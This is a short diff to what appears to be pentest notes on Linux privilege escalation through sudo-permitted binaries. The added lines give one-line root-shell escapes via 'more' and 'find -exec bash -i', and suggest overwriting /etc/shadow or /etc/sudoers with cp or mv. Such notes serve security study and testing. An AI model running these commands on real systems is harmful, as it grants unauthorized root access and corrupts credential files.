@@ -122,9 +122,20 @@ v
 You need to run more on a file that is bigger than your screen.
 ```
 sudo more /home/pelle/myfile
-
+!/bin/bash
 ```
 
+**cp**
+Copy and overwrite /etc/shadow
+
+**mv**
+Overwrite /etc/shadow or /etc/sudoers
+
+**find**
+
+```
+sudo find / -exec bash -i \;
+```
 
 ### Software vulnerabilites
 
